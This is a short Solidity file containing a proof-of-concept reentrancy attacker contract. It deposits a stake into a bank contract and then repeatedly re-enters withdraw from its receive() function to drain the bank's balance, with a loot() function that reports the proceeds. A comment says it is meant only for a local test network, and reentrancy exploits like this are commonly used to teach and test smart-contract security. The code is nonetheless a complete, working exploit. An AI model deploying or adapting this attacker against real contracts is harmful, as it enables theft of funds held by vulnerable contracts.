// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/// Proof-of-concept attacker used ONLY on a local/test network (Remix VM)
contract Attacker {
    IBank public immutable bank;
    uint256 public immutable stake;

    constructor(address _bank) payable {
        bank  = IBank(_bank);
        stake = msg.value;
    }

    function attack() external {
        bank.deposit{value: stake}();
        bank.withdraw(stake);
    }

    // re-enter every time the bank pays us, while the bank still has funds
    receive() external payable {
        if (address(bank).balance >= stake) {
            bank.withdraw(stake);
        }
    }

    function loot() external view returns (uint256) {
        return address(this).balance;
    }
}
